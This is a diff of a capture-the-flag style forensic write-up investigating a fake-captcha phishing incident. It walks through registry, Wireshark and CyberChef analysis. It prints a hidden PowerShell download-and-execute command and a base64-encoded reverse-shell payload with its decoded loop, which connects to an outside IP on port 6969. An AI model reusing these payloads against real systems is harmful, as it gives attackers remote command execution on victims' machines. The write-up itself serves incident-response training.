@@ -3,7 +3,7 @@
 Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.
 
 ## Task 1
-It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
+**It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.**
 
 ### Registry Analysis
 To analyze the registry for the user, I will use ![RegRipper](https://github.com/keydet89/RegRipper3.0) and run all the plugins applicable to the user's registry hive and save it to a text file to go through.
@@ -34,7 +34,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebCli
 ```
 
 ## Task 2
-At what time in UTC did the malicious payload execute?
+**At what time in UTC did the malicious payload execute?**
 
 ## Explanation
 Because the last write time in the RunMRU key was the malicious powershell command, we can assume that the last write tag for that key is also the time of execution for the payload.
@@ -45,7 +45,7 @@ Because the last write time in the RunMRU key was the malicious powershell comma
 ```
 
 ## Task 3
-The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
+**The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?**
 
 ### Investigation
 To get the contents of the powershell script, we can use ![Wireshark](https://www.wireshark.org/) to view the contents of the script since they used unencrypted HTTP to download the script and execute it in memory.
@@ -64,6 +64,18 @@ HTTP Stream:
 
 ![HTTP Stream](./Images/http_stream_pikaptcha.png)
 
+Now that we have the payload which was executed in memory, we can get the sha256 hash by using the following command in a Linux shell, giving us the flag.
+```text
+echo "powershell -e <base64 encoded payload>" | sha256sum
+```
+### Flag
+```
+579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE
+```
+## Task 4
+**To which port did the reverse shell connect?**
+
+### Investigation
 In the image provided we can see the HTTP stream containing base64 encoded powershell. The -e flag is used to specify the command is encoded. To work with the data, we can use GCHQ's ![CyberChef](/https://gchq.github.io/CyberChef/). Below is the raw base64 encoded blob.
 ```powershell
 JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAAzAC4AMgAwADUALgAxADEANQAuADQANAAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
@@ -104,9 +116,16 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
 # Close the client socket when the loop ends (connection closed)
 $client.Close()
 ```
+The powershell above is a textbook **Reverse Shell** and in the first line of the script, the reverse shell specifies to what IP address and to what port the host will communicate to, giving us the flag for this question.
+### Flag
+```text
+6969
+```
 
 ## Task 5
-For how many seconds was the reverse shell connection established between C2 and the victim's workstation?
+**For how many seconds was the reverse shell connection established between C2 and the victim's workstation?**
 
 ### Explanation
-To find the answer, we can follow the TCP stream TCP stream that happened immediately after the request for **"/office2024install.ps1".
+To find the answer, we can follow the TCP stream TCP stream that happened immediately after the request for **"/office2024install.ps1"**. Since the tcp stream for execuring the script was tcp stream 219. You can use the following filter to view that stream:
+- tcp.stream eq 220
+To view the commands the threat actor issued, you can click on any of the packets that appeared after the filter and press **Ctrl + Alt + Shift + T** which will display these 
